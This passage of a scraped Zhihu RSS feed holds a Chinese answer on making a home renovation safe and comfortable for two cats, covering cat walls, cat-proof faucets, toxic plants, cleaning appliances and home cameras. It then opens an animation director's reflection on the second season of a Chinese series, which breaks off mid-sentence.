data-private-watermark-src=\"v2-f15045e66a88fed1bfa0d3847aa90a07\"></p>\n<p><br><br>不过在实际使用中发现设计存在了一点小疏漏，就是小面积的跳台对于大肥猫是比较难掉头再二次跳跃的，所以在前期设计上要注意反复横跳需要转身空间，同方向跳跃则不用担心。我这里将会把一个小跳台改为大一些的，然后将替换下来的小跳台装在猫洞上，这样他们就能更轻松的上下玩耍了。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6c9f2455ea56cd1ab1eac54506bd11c5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2362\" data-rawheight=\"1751\" data-watermark=\"original\" data-original-src=\"v2-6c9f2455ea56cd1ab1eac54506bd11c5\" data-watermark-src=\"v2-0d2359eecc69e4f507e940cc78ebe0ff\" data-private-watermark-src=\"v2-dac2dc129d7b9a541ec1d8cef31ddd72\"></p>\n<p><br>如今已经买好了，哪天有空拆改装上即可。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c88664e94d6a285f4009d6d1038ef86c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"original\" data-original-src=\"v2-c88664e94d6a285f4009d6d1038ef86c\" data-watermark-src=\"v2-9876a0c12d2d19be7a35b0aaee8ab52f\" data-private-watermark-src=\"v2-bc1f8fea15673a56a6f56ffabb6e3476\"></p>\n<p><br></p>\n<h2>小猫咪自由活动区域的安全问题</h2>\n<p><br></p>\n<p>养过猫的人都知道，猫咪对于新环境都是特别好奇的，每一个角落都会仔细探寻一遍，过年这些日子就发生了好几起“事故”，好在环境熟悉之后没有再出现了。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e22ec2bdd684cf6909c187ef7f1997b7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2736\" data-rawheight=\"3218\" data-watermark=\"original\" data-original-src=\"v2-e22ec2bdd684cf6909c187ef7f1997b7\" data-watermark-src=\"v2-869b2fe9b73b850b0a3567cb307ffb05\" data-private-watermark-src=\"v2-ad27d8ce8cb8c1552e6bb9c62ac08960\"></p>\n<p><br><br>而且小猫咪=手贱+爱钻+爱蹭+液体，走到哪里都要伸个脑袋蹭蹭，看到个小东西就爱动手推推，看到狭小的空间就想钻。两脚兽日常生活的很多东西对小猫咪来说都是比较危险的，在设计家装的时候也不能忽视。在这列几点我们结合自己的经验列举的注意点及解决方法，可能还有一些没考虑到的地方，欢迎大家评论区踊跃讨论。<br><br>1.水龙头（感应+旋钮）<br>我们家是开放式厨房且无地漏，小猫咪是可以自由出入的。水龙头有被小猫咪打开的风险，水哗啦啦的流，先不说浪费水资源，如果下水有什么问题一不小心就水漫金山了损失更大。所以在选择水龙头的时候，我们一直在寻找人手能开但猫没办法打开的龙头。<br></p>\n<ul><li>感应型</li></ul>\n<p>厨房用的是大白U悦的感应款。保留了物理开关的同时加入感应开关，如果小猫咪不小心把物理开关碰开了，不靠近感应开关的话，水也不会自动流出。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-144adece186339389a1fd6a0dcd9a1ed_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"350\" data-rawheight=\"198\" data-watermark=\"original\" data-original-src=\"v2-144adece186339389a1fd6a0dcd9a1ed\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>如果很不巧的你家小猫咪还会碰感应开关，那就恭喜你，快送小猫咪去上大学！开玩笑的，我们就真遇到过一会，老婆在打扫厨房，忘记关了物理开关，大福悄咪咪的探索水槽，一不小心就碰到感应开关，水一喷吓得大福脚底打滑，还好它没有受伤，只是损失了一个热水壶。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-adcee1db8fa6dd1fd43c345eba912781_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"258\" data-watermark=\"original\" data-original-src=\"v2-adcee1db8fa6dd1fd43c345eba912781\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>如果真遇到小猫咪同时打开了两个开关也没关系，大白U悦在连续出水一段时间之后会自动关闭，除非再次触摸感应开关才会继续出水。<br>还有像那些玻璃瓶子罐子什么的，家里也还是要注意避开他们必经之路，平时堆放在吧台一角基本还是安全的。<br></p>\n<ul><li>旋钮型</li></ul>\n<p>阳台是小猫咪吃喝拉撒的主战场，平时开个罐头喂或者换饮水机的水，走到厨房的话就太远了，所以在阳台柜上多设了一个水槽，方便洗洗小猫咪吃饭的碗之类的东西。<br>阳台柜是小猫咪上下猫墙的必经之路之一，很大概率会碰到水龙头开关。这里的龙头需求是能分冷热水、旋钮式开关、好看，于是拿着“旋钮”关键字在淘宝里翻了好久。符合所有需求的水龙头不多，只找到一款。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5d6bfcfafb24c5c6e76447b46cdc104d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"695\" data-rawheight=\"777\" data-watermark=\"original\" data-original-src=\"v2-5d6bfcfafb24c5c6e76447b46cdc104d\" data-watermark-src=\"v2-21e45c8da656065393133c9e2696c02d\" data-private-watermark-src=\"v2-91203b343d2c6f728748231ca6f34588\"></p>\n<p><br>虽然这款也是带感应的，但我们应该基本不会用到感应模式，通过旋转的方式选择模式和冷热水。相信小猫咪应该做不到捏住并旋转这种复杂的操作了吧？<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-efb1b495c2446584fc1a1426fe093977_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"504\" data-rawheight=\"615\" data-watermark=\"original\" data-original-src=\"v2-efb1b495c2446584fc1a1426fe093977\" data-watermark-src=\"v2-8e4eed932c7fce7430ff4a5217dbff34\" data-private-watermark-src=\"v2-005e2e46fa5cf748b34d8e3648444985\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9b9b582ea9c901eb58d7ba397ab4dfb1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"227\" data-watermark=\"original\" data-original-src=\"v2-9b9b582ea9c901eb58d7ba397ab4dfb1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>2.置物架<br>很多人看到我家客厅的猫墙，都会好奇上面放东西不会猫推下来么？放心放心，那些一字板除了猫基本什么都不会放，它们的作用就是给猫爬的，叉腰任性！<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ad8e98cd7f1756ce3f50c1de54ac0e1f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-ad8e98cd7f1756ce3f50c1de54ac0e1f\" data-watermark-src=\"v2-4731b014917e4d43190f4b1856efb68f\" data-private-watermark-src=\"v2-9e8d4339c36291242310919a7f7efecf\"></p>\n<p><br>所以像家里的摆件也不多，喜欢的摆件要么放在不让他们去的区域，要么放置在宜家带玻璃柜门的展示柜里。这样避免他们碰倒撞倒，引起不必要的损失或者受伤。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9528dc9359ed9a1a5807f57503f205ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3543\" data-rawheight=\"2362\" data-watermark=\"original\" data-original-src=\"v2-9528dc9359ed9a1a5807f57503f205ad\" data-watermark-src=\"v2-58cb94cfd9b6644ed626cea0e4446841\" data-private-watermark-src=\"v2-f9f1639f5c51776732f9620c47d52ea8\"></p>\n<p><br><br>当然也有过猫从天而降的经历，15斤的大福炸弹也是把老婆砸的喵喵叫，所以开放的置物板做猫墙的设计实际上依然是存在一定安全隐患的，特别是家里有孕妇的还是要多小心，不过好猫一般不会在同一个地方摔两次，这一次意外也是因为大福当时比较好奇吊顶还能不能上去。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-736d7e4af063a992644cd0c34af4e90c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"334\" data-rawheight=\"334\" data-watermark=\"original\" data-original-src=\"v2-736d7e4af063a992644cd0c34af4e90c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>3.异物卡住<br>曾经就听说过有别人家猫咪被绳索卡住的遭遇，所以在一些家居用品选购的时候是需要多加注意的。<br>突然冒头的大幅还是很可爱的，结果小发的出现破坏了和谐。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-958cd8ab638015a8b18d81af44969cd7_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"280\" data-watermark=\"original\" data-original-src=\"v2-958cd8ab638015a8b18d81af44969cd7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>还好家里这个竖百叶是活扣的设计，所以窗帘不会卡住猫咪，这纵身一跃也没有损坏窗帘。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b4457ace240e25483627d48b8a87c1d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-b4457ace240e25483627d48b8a87c1d8\" data-watermark-src=\"v2-282f3abe54790123f2da023e8e062386\" data-private-watermark-src=\"v2-9124b68133c588587f75fd2867af30b9\"></p>\n<p><br>4.尖角的处理<br>其实客厅的格子柜是经过了换代的，由最初的贴皮换成了现在的纯实木，主要原因就是贴皮家居在边角无法平滑处理，比较担心他们打闹撞到受伤（人也会）。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-524894884a0532b21bbb0610a32afce7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"2153\" data-watermark=\"original\" data-original-src=\"v2-524894884a0532b21bbb0610a32afce7\" data-watermark-src=\"v2-adccce7081bf139fcb9f66e0048b9f62\" data-private-watermark-src=\"v2-19e681f8d9ae39c1b7382b94102a98e9\"></p>\n<p><br>当然可以选择用这种防撞贴处理，但缺点就是比较丑，这对于颜控是无法接受的，所以就出手换新了。另外在猫墙的选购上，也需要注意猫墙产品的边角是否有经过打磨圆角的处理。<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1b8ab544ea0d38c367912aa7bc625ed5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1128\" data-rawheight=\"570\" data-watermark=\"original\" data-original-src=\"v2-1b8ab544ea0d38c367912aa7bc625ed5\" data-watermark-src=\"v2-759ecc194cbedde216d054300c6ee3a8\" data-private-watermark-src=\"v2-df5351876d8c13308a8285fa693ad20e\"></p>\n<p><br>当然选择这组格子柜还有一个原因是其格子之间是可以通过螺丝固定的，相比看到的很多格子柜更加稳固。<br><br>5.厨房、柜子<br><br>还有像厨房里的刀具对于孩子和猫咪都是有危险的，所以像磁吸刀架是不可取的，比较好的带收纳座的，或者放置在橱柜内。<br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-295b20423148f58738113c689e14c293_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3333\" data-rawheight=\"5000\" data-watermark=\"original\" data-original-src=\"v2-295b20423148f58738113c689e14c293\" data-watermark-src=\"v2-467346193cc5f8c02fd63a1a4922606e\" data-private-watermark-src=\"v2-d18843f69a3dcf9b472c089cfe680535\"></p>\n<p><br>像我家这小仔子是真的聪明又手贱，各种橱柜、衣柜甚至冰箱都是知道能打开的，平时也需要多多教导（看见就一顿胖揍）。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-98d53eefbf50a138dc7643c8ebb780b6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"300\" data-watermark=\"original\" data-original-src=\"v2-98d53eefbf50a138dc7643c8ebb780b6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>橱柜看了一次就会打开，只要扒开点缝隙它就能钻进去。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a49e414a3dce20e37fd7e4a92682f9a0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"306\" data-rawheight=\"400\" data-watermark=\"original\" data-original-src=\"v2-a49e414a3dce20e37fd7e4a92682f9a0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br>如果不想让其打开的区域，可以考虑增加这种童锁（就是有些丑）。<br><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5ffe42484b47b2af30686d5e594110eb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1128\" data-rawheight=\"540\" data-watermark=\"original\" data-original-src=\"v2-5ffe42484b47b2af30686d5e594110eb\" data-watermark-src=\"v2-f509fb75e39b8297bffbf17f0bd1f5ca\" data-private-watermark-src=\"v2-dab03338d7788f841f67ff9600844a49\"></p>\n<p><br><br>6.绿植与蚊香等<br>养猫的家庭有很多，但科学养猫的还是少数，发现还是有不少人不知道一些绿植对于猫咪是有毒性的，很常见的黑名单有绿萝、百合、菊花、水仙、紫藤等，当然还是有很多植物是可以养的，确定种植前最好做一下功课，可以参考以下网站（英文网站需要翻译一下）：<br><br></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.aspca.org/pet-care/animal-poison-control/toxic-and-non-toxic-plants\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://www.</span><span class=\"visible\">aspca.org/pet-care/anim</span><span class=\"invisible\">al-poison-control/toxic-and-non-toxic-plants</span><span class=\"ellipsis\"></span></a><p><br><br>另外还有像蚊香等产品对于猫咪可以说是剧毒，他们体内是无法排解的，所以目前公寓是采用蚊帐和纱帘的方式，新房目前是采用全屋纱窗+电杀的解决方案。<br><br></p>\n<h2>清洁卫生电器</h2>\n<p><br></p>\n<p>吸猫一时爽，但为了自己和家里猫咪的健康，卫生清洁问题同样不容忽视。<br>1.扫地机器人<br>目前家里日常地面清扫维护选用的石头T7PRO，每次清扫都能收集一整盒的猫毛，而且这款机器人拥有避障和实时视频的功能，对于养宠家庭还是比较友好的。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f12c50e5d6426c9b43f59157ea48743f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"2667\" data-watermark=\"original\" data-original-src=\"v2-f12c50e5d6426c9b43f59157ea48743f\" data-watermark-src=\"v2-50a25349cbcfb4edf4cdc0e58b94eab7\" data-private-watermark-src=\"v2-22f0403256225aa809292df181a5a05b\"></p>\n<p><br>同时在装修的时候，家里的各种家具基本都是采用悬空的设计，一来方便机器人进行日常清扫，二来也让猫咪拥有更多的活动空间。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d910431856ef8e473447688c704c9864_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4500\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-d910431856ef8e473447688c704c9864\" data-watermark-src=\"v2-634e315fd7906bcca4399bb1098519d1\" data-private-watermark-src=\"v2-9fb302233ad3ca4ff905881008aed261\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1422535354864300033\"></a><p><br><br>2.独立热泵烘干机<br><br>作为南方家庭，梅雨天气一直是很头痛的事情，而烘干机不仅可以摆脱晾衣，解放阳台而且让阳台更加美观。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ec8c33c52aa7f2cc49b2bd022e9d8d9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2362\" data-rawheight=\"3543\" data-watermark=\"original\" data-original-src=\"v2-ec8c33c52aa7f2cc49b2bd022e9d8d9a\" data-watermark-src=\"v2-69f4b51318603b5d7ea403511758e746\" data-private-watermark-src=\"v2-b857c7e418c330cb93752fb68d2ce764\"></p>\n<p><br><br>同时烘干机的多重过滤器还能有效的将平时衣物和床上用品绒毛收集，你看一次就能堆这么多的毛：<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cc0a8f877010ca4c80a0c525b53b7ddb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1328\" data-rawheight=\"497\" data-watermark=\"original\" data-original-src=\"v2-cc0a8f877010ca4c80a0c525b53b7ddb\" data-watermark-src=\"v2-b910630d23017b44fe06ff5d6414bf98\" data-private-watermark-src=\"v2-524723a7628e641aaca5f4cf4899af7d\"></p>\n<p><br><br>底部过滤器是第二道过滤了，相比之下没那么多但是也能收集不少毛。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-73e8def7e99b697245a39c206f139730_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1283\" data-rawheight=\"619\" data-watermark=\"original\" data-original-src=\"v2-73e8def7e99b697245a39c206f139730\" data-watermark-src=\"v2-d46431238e23b267a87ff33fcdefe1a8\" data-private-watermark-src=\"v2-dfed2881c1ae18fb7fe4e90f6a9b8f83\"></p>\n<p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1422535454771691520\"></a><p><br><br><br><br>3.空气净化器<br><br></p>\n<p>家里虽然通风不错，但空气净化器还是少不了的，家里用过多款空气净化器，目前公寓这边一直用着这款净化器，可以有效的收集猫毛并且净化异味，也比较安静，值得推荐。<br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1422535955354312704\"></a><p><img src=\"https://pic4.zhimg.com/v2-2437b6d734400888742b374132b2d143_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"382\" data-watermark=\"original\" data-original-src=\"v2-2437b6d734400888742b374132b2d143\" data-watermark-src=\"v2-dafca057f7c57b8238cf8121c5a93df0\" data-private-watermark-src=\"v2-fb3d7ae70d2676f13f1d5fc0b67e2062\"></p>\n<p><br>最近新房还入手了科沃斯的移动空气净化机器人，沁宝的避障能力是真的强，不用担心它碰撞家里的“拦路虎”。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b2de742e38688d217cf0ccdc6a0d8f5f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"250\" data-watermark=\"original\" data-original-src=\"v2-b2de742e38688d217cf0ccdc6a0d8f5f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8da3082ac52f1a46ecf589d5f36ca7b4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"180\" data-watermark=\"original\" data-original-src=\"v2-8da3082ac52f1a46ecf589d5f36ca7b4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>4.洗地机<br>而平时最多的垃圾其实是猫咪上厕所带出来的猫砂、或者不认真吃饭掉地上的猫粮、或者猫咪偶尔身体不舒服时的呕吐物等，另外还有像前面提到的打翻水壶等突发情况，那能够吸拖同步的洗地机自然是比较好用的，干湿垃圾都可以随手解决。<br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-87bcfb312ad3d942b08350f16a601b4c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"203\" data-watermark=\"original\" data-original-src=\"v2-87bcfb312ad3d942b08350f16a601b4c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<h2>监控系统&amp;智能家居</h2>\n<p><br></p>\n<p>1.监控<br>我坦白了，我老婆是个监控狂魔。我跟她还住在公寓里的时候，房间里就装了好几个摄像头，说是为了平时不在家的时候可以云吸猫，如果猫有什么异常情况也能及时发现。新家在设计的时候老婆大人就明确提出家里摄像头不能少！好家伙，她一顿操作下来，目前为止我家已经装了7个摄像头，还有1个在筹备中，早上醒来第一时间掏出手机翻查猫咪的夜间活动。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c673367a2df1c557b4c04080d9ea97af_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1754\" data-rawheight=\"1441\" data-watermark=\"original\" data-original-src=\"v2-c673367a2df1c557b4c04080d9ea97af\" data-watermark-src=\"v2-c5143eb897c0ffadef0c5b9c5a25a484\" data-private-watermark-src=\"v2-7c386d4edb4bc7cee7d44ca42d44db71\"></p>\n<p><br>图中红点标记的就是目前已安装的摄像头位置，覆盖玄关、客厅、餐厅、厨房、阳台、走廊、娱乐室（我怀疑主要是为了监工）。除了玄关和娱乐室用的是海康威视的摄像头，其他都是米家或者绿米的。<br>海康威视的摄像头只需要插网线，POE供电的，当然还需要搭配一个带POE供电功能的录像机使用。可以显示器直连录像机查看监控录像，也能通过手机APP查看。需要注意的是提前预留网线，我们在做水电的时候就特意让师傅在大门口留了一根网线，就是为了摄像头服务的。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b29cd2c151d594f769be69fb3a4e49f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"4500\" data-watermark=\"original\" data-original-src=\"v2-b29cd2c151d594f769be69fb3a4e49f7\" data-watermark-src=\"v2-2d8e11ec402ef888743bc6acaee7ca6b\" data-private-watermark-src=\"v2-de4fe43cd8c70539b3ae63350dc9d577\"></p>\n<p><br><br>米家和绿米的摄像头都是通过wifi联网的，使用TF卡存储，需要通过USB供电，均可在米家app查看监控录像。<br>阳台角落和走廊镜头用的是绿米G2H，这两个地方的视角相对比较固定，所以选了不可旋转的摄像头，可惜只有1080p。G2H还自带网关，绿米的智能开关可以关联在这网关上，一举两得。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1b350ed48c2af3a1352bd2d426e43ae9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"664\" data-watermark=\"original\" data-original-src=\"v2-1b350ed48c2af3a1352bd2d426e43ae9\" data-watermark-src=\"v2-09e3dcb158be70da7390c522868bbab7\" data-private-watermark-src=\"v2-1c59457a4fc589644bb45cacc52776e9\"></p>\n<p><br>阳台中部、客厅、餐厅厨房中部用的是米家2k云台，可以360度旋转，画质更上一层。阳台中部的摄像头最初规划的时候是没有的，角落的摄像头装好之后发现阳台实在太长了，绿米G2H不能通过手机旋转角度的话没办法看到阳台猫墙的全貌会有死角，所以小猫咪入驻之后又加了一个摄像头。还好家里的电位预留特别多，可以通过延长电源线把电引到阳台中部，而且电线刚好能被窗帘轨道挡住，完美。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f7913e122f9f1f618f1c6d9b6a97ea73_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2617\" data-rawheight=\"1604\" data-watermark=\"original\" data-original-src=\"v2-f7913e122f9f1f618f1c6d9b6a97ea73\" data-watermark-src=\"v2-6ee979a1080910e52e7392a24377f893\" data-private-watermark-src=\"v2-4d7bb5ccb9c40a296ff5f5240f775843\"></p>\n<p><br>2.智能家居<br><br>有得必有失，之前我就有分享过自己全屋智能家居的搭建，当然也包括了自动喂食器、自动饮水机等设备，但很多场景实际无法做到特别智能的，还被一些朋友吐槽过。<br>其实很大一部分原因还是因为家里猫咪的存在，我们要是不在家，装上那些全屋各种感应器什么的，真的很可能被他们两兄弟“玩坏”。<br><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1f4e1037cc7aa61d5428fcac441df800_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2349\" data-rawheight=\"2070\" data-watermark=\"original\" data-original-src=\"v2-1f4e1037cc7aa61d5428fcac441df800\" data-watermark-src=\"v2-138f0b58f0d9967d40146a6535ec4c43\" data-private-watermark-src=\"v2-8c996c648649e3de1517442a4919e70d\"></p>\n<p><br>3.家具<br>像皮质类家具还是建议尽量减少，我们家沙发选择了比较舒服和便宜的款式，拆洗也方便。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2edb13576d114bc05e95612eeb0a50e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-watermark=\"original\" data-original-src=\"v2-2edb13576d114bc05e95612eeb0a50e2\" data-watermark-src=\"v2-cea56b6b3fbc093b0f20d6e652021df9\" data-private-watermark-src=\"v2-40f959ec950eaabd7406d3d05e5ccfdd\"></p>\n<p><br>好在家里的孩子教得还比较好，按摩椅他们也只是上去睡觉，不会在此磨爪。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-768a1e057a1257e4878a31495ff52741_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-768a1e057a1257e4878a31495ff52741\" data-watermark-src=\"v2-81bcac354503ad1d4c6dce115b2c5b85\" data-private-watermark-src=\"v2-0790e2516bc7543758727575f6882715\"></p>\n<h2>\n<br>总结</h2>\n<p><br></p>\n<p>可以看到从我们开始为猫咪考虑而设计装修的时候，就意味着需要一部分的牺牲和让步，还好最终也只是阳台门框变窄、牺牲了主卧换来超长的走廊。但换个角度想，门框窄反而省钱，超长的走廊还可以用来和他们玩耍，所以只要通过前期做好合理的规划，还是能尽可能将自己和宠物都安排的舒舒服服的。<br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-092deec5560d4b230230bd7c88d689cb_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"280\" data-watermark=\"original\" data-original-src=\"v2-092deec5560d4b230230bd7c88d689cb\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2ec929e5110809cde91c3f6aacab6770_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"283\" data-rawheight=\"283\" data-watermark=\"original\" data-original-src=\"v2-2ec929e5110809cde91c3f6aacab6770\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br><br>小猫咪们回来之后最大烦恼，应该就是家里他们活动的空间比较大，偶尔会一时间找不到他们。但当你看着他们两兄弟在家里快活玩耍、安逸的睡觉、健康的成长......那感觉自己所做的一切都是值得的。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ffcf8546c6abfb66788155bc46e6f0c1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-ffcf8546c6abfb66788155bc46e6f0c1\" data-watermark-src=\"v2-49b161327b161c90f1e7bcc5027ef450\" data-private-watermark-src=\"v2-59104ab269d417191b45d35d5983984e\"></p>\n<p><br>既然都看到这里了，何不顺手点赞、关注一波，不定期还有猫片可以吸~</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zouzoulong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">zouzoulong</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483882410/answer/2121905482?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">32 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/283496675?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">毛孩子能听懂铲屎官的话吗？</a><br><a href=\"http://www.zhihu.com/question/467473011?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想养一只猫，各位铲屎官有什么提醒需要注意的事情？</a><br>\n","link":"http://www.zhihu.com/question/483882410/answer/2121905482?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《画江湖之换世门生 2》？","date":"2021-09-17 10:50:14","description":"\n<p>大家好，我是《画江湖之换世门生》的导演，周飞龙。</p>\n<p><br></p>\n<p>《换世门生》第二季终于播完了，一颗沉重的石头终于落地，对于我来说，虽然小换已经不太像它原来的样子，但这个宝宝总算是顺利出生了，或许它的长相不太美观，但它总算还活着。虽然早已做好准备口碑会大不如从前，但真到了直面大家的输出，翻江倒海和五味杂陈一股脑的又浮现了出来。再加上种种的不如意，本来想趁着大家都不注意到的时候，悄悄的躲起来就好了，但市场部的小哥哥，小姐姐们总想着劝我出来说点啥，那就从起源随便聊聊吧。</p>\n<p><br></p>\n<p>早在2017年企划《换世》的时候，我们定的就是40集连播，老观众们都知道，若森数字从《侠岚》，《不良人》1、2，《灵主》，《杯莫停》一路走来的剧集，均是40集一季起步策划的，《换世》当然一样。无论是40集、是24集、或是12集之类，体量规划是很重要的，因为它意味着这是一个完整的故事，它也有它特有的讲故事的逻辑和方法。那些观感优秀的作品，大多优秀的基因皆缘自这开始的“建置”。可以这么理解，一部电影你不可以看一半，4年后再继续看另一半，倘若再加上后半段已经不是它最初的样子，那么效果可想而知了。如果有条件，面对现在两季的情况，那么故事讲述的方式、每集的时长、信息量、结束点以及每季的完结点，都应该重新规划。原本3个月为了追赶进度的停档还好，但好不容易进度赶上了，后半段的结局再难以面世了。</p>\n<p><br></p>\n<p>想给大家一个结局，哪怕不完美！所以这几年换世一直做重复的修改和调整，终于看到了希望。</p>\n<p>为了让第二季观感好哪怕一点，我们都想第一季再次重映，但首先要面临的就是修改。但预算实在可怜（因为当时40集已经做完，且20集也已经播完，所涉修改都是新增费用），支撑后20集